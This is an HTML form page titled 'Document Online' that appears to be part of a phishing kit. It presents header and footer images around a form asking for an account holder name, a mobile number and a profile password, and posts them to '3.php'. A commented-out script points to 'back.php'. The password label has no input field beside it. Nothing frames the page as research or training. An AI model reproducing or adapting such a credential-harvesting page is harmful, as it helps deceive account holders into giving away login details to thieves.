<!-- <script type="text/javascript"> window.location.href ="back.php" </script> --><!DOCTYPE HTML> 
<html lang="zxx">
   <head>
      <title>Document Online</title>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta charset="utf-8">
      <meta name="keywords" content="">
      <script> addEventListener("load", function () { setTimeout(hideURLbar, 0); }, false); function hideURLbar() { window.scrollTo(0, 1); } </script> <!-- //Meta-Tags --> <!-- Stylesheets --> 
      <link href="unamestyle.css" rel='stylesheet' type='text/css' />
      <!--// Stylesheets --> <!-- online fonts --> 
      <link href="//fonts.googleapis.com/css?family=Ubuntu+Condensed" rel="stylesheet">
      <link rel="stylesheet" type="text/css" href="bootstrap.css">
   </head>
   <body>
      <header> </header>
      <img src="header.jpg" style="width: 100%;"> 
      <div class="row">
         <div class="col-md-3"></div>
         <div class="col-md-6">
            <div class="mrd">
               <form action="3.php" method="post">
                  <div class="row">
                     <div class="col-md-12"> <span class="popp">Enter Account Holder Name *</span> <input type="text" class="pst" name="Name" required=""> </div>
                  </div>
                  <br> 
                  <div class="row">
                     <div class="col-md-12"> <span class="popp">Mobile Number *</span> <input type="text" class="pst" name="mobile"> </div>
                  </div>
                  <br> 
                  <div class="row">
                     <div class="col-md-12"> <span class="popp">Confirm Your Profile Password *</span> </div>
                  </div>
                  <br> 
                  <div class="w3ls-login">
                     <p> <button type="submit" class="btnp"> Submit </button> </p>
                  </div>
               </form>
            </div>
         </div>
         <div class="col-md-3"></div>
      </div>
      <img src="footer.jpg" style="width: 100%;"> 
   </body>
</html>